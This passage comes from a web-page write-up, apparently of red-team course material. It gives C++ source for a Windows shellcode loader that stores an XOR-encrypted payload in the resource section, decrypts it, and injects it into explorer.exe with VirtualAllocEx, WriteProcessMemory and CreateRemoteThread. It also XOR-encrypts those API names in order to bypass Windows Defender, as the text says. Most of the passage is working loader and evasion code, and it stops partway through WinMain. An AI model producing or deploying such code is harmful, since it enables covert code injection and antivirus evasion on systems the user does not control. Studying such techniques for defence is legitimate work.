	<span class="n">res</span> <span class="o">=</span> <span class="n">FindResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">MAKEINTRESOURCE</span><span class="p">(</span><span class="n">FAVICON_ICO</span><span class="p">),</span> <span class="n">RT_RCDATA</span><span class="p">);</span>
	<span class="n">resHandle</span> <span class="o">=</span> <span class="n">LoadResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">res</span><span class="p">);</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">LockResource</span><span class="p">(</span><span class="n">resHandle</span><span class="p">);</span>
	<span class="n">payload_len</span> <span class="o">=</span> <span class="n">SizeofResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">res</span><span class="p">);</span>
</pre></table></code></div></div><h3 id="memory-and-decryption"><span class="mr-2">Memory and Decryption</span><a href="#memory-and-decryption" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now allocate some space in the buffer and decrypt the payload:</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>	<span class="c1">// Allocate some memory buffer for payload</span>
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>

	<span class="c1">// Copy payload to new memory buffer</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	
	<span class="c1">// Decrypt (DeXOR) the payload</span>
	<span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
</pre></table></code></div></div><h3 id="injection"><span class="mr-2">Injection</span><a href="#injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Search for the <strong>explorer.exe</strong> and inject the payload:</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>	<span class="c1">// Injection into explorer.exe</span>
	<span class="n">pid</span> <span class="o">=</span> <span class="n">FindTarget</span><span class="p">(</span><span class="s">"explorer.exe"</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>

		<span class="c1">// try to open target process</span>
		<span class="n">hProc</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span> <span class="n">PROCESS_CREATE_THREAD</span> <span class="o">|</span> <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span> 
						<span class="n">PROCESS_VM_OPERATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span> <span class="o">|</span> <span class="n">PROCESS_VM_WRITE</span><span class="p">,</span>
						<span class="n">FALSE</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">pid</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">hProc</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">Inject</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProc</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><hr /><h2 id="obfuscation"><span class="mr-2">Obfuscation</span><a href="#obfuscation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To bypass some Windows Defender protection we can try to obfuscate the program. We will obfuscate <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code>, <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> and <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code>. Create the pointes:</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="n">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pVirtualAllocEx</span><span class="p">)(</span>
  <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span>
  <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
  <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
  <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
  <span class="n">DWORD</span>  <span class="n">flProtect</span>
<span class="p">);</span>

<span class="n">BOOL</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pWriteProcessMemory</span><span class="p">)(</span>
  <span class="n">HANDLE</span>  <span class="n">hProcess</span><span class="p">,</span>
  <span class="n">LPVOID</span>  <span class="n">lpBaseAddress</span><span class="p">,</span>
  <span class="n">LPCVOID</span> <span class="n">lpBuffer</span><span class="p">,</span>
  <span class="n">SIZE_T</span>  <span class="n">nSize</span><span class="p">,</span>
  <span class="n">SIZE_T</span>  <span class="o">*</span><span class="n">lpNumberOfBytesWritten</span>
<span class="p">);</span>

<span class="n">HANDLE</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pCreateRemoteThread</span><span class="p">)(</span>
  <span class="n">HANDLE</span>                 <span class="n">hProcess</span><span class="p">,</span>
  <span class="n">LPSECURITY_ATTRIBUTES</span>  <span class="n">lpThreadAttributes</span><span class="p">,</span>
  <span class="n">SIZE_T</span>                 <span class="n">dwStackSize</span><span class="p">,</span>
  <span class="n">LPTHREAD_START_ROUTINE</span> <span class="n">lpStartAddress</span><span class="p">,</span>
  <span class="n">LPVOID</span>                 <span class="n">lpParameter</span><span class="p">,</span>
  <span class="n">DWORD</span>                  <span class="n">dwCreationFlags</span><span class="p">,</span>
  <span class="n">LPDWORD</span>                <span class="n">lpThreadId</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Inside the <code class="language-plaintext highlighter-rouge">Inject</code> function we will create the pointers. Also, they will be XOR encrypted, so first we need to encrypt the strings:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">C:\Users\Zeropio&gt;</span>C:<span class="se">\P</span>ython27<span class="se">\p</span>ython.exe <span class="nt">-i</span> xorencrypt.py
<span class="gp">&gt;</span><span class="o">&gt;&gt;</span> printCiphertext<span class="o">(</span>xor<span class="o">(</span><span class="s2">"VirtualAllocEx"</span>, <span class="s2">"mysecretkeee"</span><span class="o">))</span>
<span class="gp">{ 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };</span><span class="w">
</span><span class="gp">&gt;</span><span class="o">&gt;&gt;</span> printCiphertext<span class="o">(</span>xor<span class="o">(</span><span class="s2">"WriteProcessMemory"</span>, <span class="s2">"mysecretkeee"</span><span class="o">))</span>
<span class="gp">{ 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };</span><span class="w">
</span><span class="gp">&gt;</span><span class="o">&gt;&gt;</span> printCiphertext<span class="o">(</span>xor<span class="o">(</span><span class="s2">"CreateRemoteThread"</span>, <span class="s2">"mysecretkeee"</span><span class="o">))</span>
<span class="gp">{ 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };</span><span class="w">
</span></pre></table></code></div></div><p>And now we can create the pointers:</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">sVirtualAllocEx</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x1</span> <span class="p">};</span>
		<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">sWriteProcessMemory</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xb</span> <span class="p">};</span>
		<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">sCreateRemoteThread</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x16</span> <span class="p">};</span>
		
		<span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">sVirtualAllocEx</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sVirtualAllocEx</span><span class="p">),</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
		<span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">sWriteProcessMemory</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sWriteProcessMemory</span><span class="p">),</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
		<span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">sCreateRemoteThread</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sCreateRemoteThread</span><span class="p">),</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
		
		<span class="n">pVirtualAllocEx</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">sVirtualAllocEx</span><span class="p">);</span>
		<span class="n">pWriteProcessMemory</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">sWriteProcessMemory</span><span class="p">);</span>
		<span class="n">pCreateRemoteThread</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">sCreateRemoteThread</span><span class="p">);</span>
</pre></table></code></div></div><p>Now replace all the functions by the pointer.</p><hr /><h2 id="compilation"><span class="mr-2">Compilation</span><a href="#compilation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The final C++ file will be:</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
</pre><td class="rouge-code"><pre><span class="cm">/*

 Red Team Operator course code template
 storing payload in .rsrc section
 
 author: reenz0h (twitter: @sektor7net)

*/</span>
<span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"resources.h"</span><span class="cp">
</span>
<span class="n">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pVirtualAllocEx</span><span class="p">)(</span>
  <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span>
  <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
  <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
  <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
  <span class="n">DWORD</span>  <span class="n">flProtect</span>
<span class="p">);</span>

<span class="n">BOOL</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pWriteProcessMemory</span><span class="p">)(</span>
  <span class="n">HANDLE</span>  <span class="n">hProcess</span><span class="p">,</span>
  <span class="n">LPVOID</span>  <span class="n">lpBaseAddress</span><span class="p">,</span>
  <span class="n">LPCVOID</span> <span class="n">lpBuffer</span><span class="p">,</span>
  <span class="n">SIZE_T</span>  <span class="n">nSize</span><span class="p">,</span>
  <span class="n">SIZE_T</span>  <span class="o">*</span><span class="n">lpNumberOfBytesWritten</span>
<span class="p">);</span>

<span class="n">HANDLE</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pCreateRemoteThread</span><span class="p">)(</span>
  <span class="n">HANDLE</span>                 <span class="n">hProcess</span><span class="p">,</span>
  <span class="n">LPSECURITY_ATTRIBUTES</span>  <span class="n">lpThreadAttributes</span><span class="p">,</span>
  <span class="n">SIZE_T</span>                 <span class="n">dwStackSize</span><span class="p">,</span>
  <span class="n">LPTHREAD_START_ROUTINE</span> <span class="n">lpStartAddress</span><span class="p">,</span>
  <span class="n">LPVOID</span>                 <span class="n">lpParameter</span><span class="p">,</span>
  <span class="n">DWORD</span>                  <span class="n">dwCreationFlags</span><span class="p">,</span>
  <span class="n">LPDWORD</span>                <span class="n">lpThreadId</span>
<span class="p">);</span>

<span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"mysecretkeee"</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">XOR</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">j</span><span class="p">;</span>
	
	<span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">==</span> <span class="n">key_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

		<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
		<span class="n">j</span><span class="o">++</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">FindTarget</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procname</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">HANDLE</span> <span class="n">hProcSnap</span><span class="p">;</span>
        <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                
        <span class="n">hProcSnap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hProcSnap</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
                
        <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span> 
                
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
                
        <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpiA</span><span class="p">(</span><span class="n">procname</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
                
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span>
                
        <span class="k">return</span> <span class="n">pid</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">Inject</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProc</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">LPVOID</span> <span class="n">pRemoteCode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
		
		<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">sVirtualAllocEx</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x1</span> <span class="p">};</span>
		<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">sWriteProcessMemory</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xb</span> <span class="p">};</span>
		<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">sCreateRemoteThread</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x16</span> <span class="p">};</span>
		
		<span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">sVirtualAllocEx</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sVirtualAllocEx</span><span class="p">),</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
		<span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">sWriteProcessMemory</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sWriteProcessMemory</span><span class="p">),</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
		<span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">sCreateRemoteThread</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sCreateRemoteThread</span><span class="p">),</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
		
		<span class="n">pVirtualAllocEx</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">sVirtualAllocEx</span><span class="p">);</span>
		<span class="n">pWriteProcessMemory</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">sWriteProcessMemory</span><span class="p">);</span>
		<span class="n">pCreateRemoteThread</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">sCreateRemoteThread</span><span class="p">);</span>

  
        <span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">pVirtualAllocEx</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
        <span class="n">pWriteProcessMemory</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span> <span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span>
        
        <span class="n">hThread</span> <span class="o">=</span> <span class="n">pCreateRemoteThread</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">WINAPI</span> <span class="nf">WinMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hInstance</span><span class="p">,</span> <span class="n">HINSTANCE</span> <span class="n">hPrevInstance</span><span class="p">,</span> 
    <span class="n">LPSTR</span> <span class="n">lpCmdLine</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nCmdShow</span><span class="p">)</span> <span class="p">{</span>
    
	<span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
	<span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
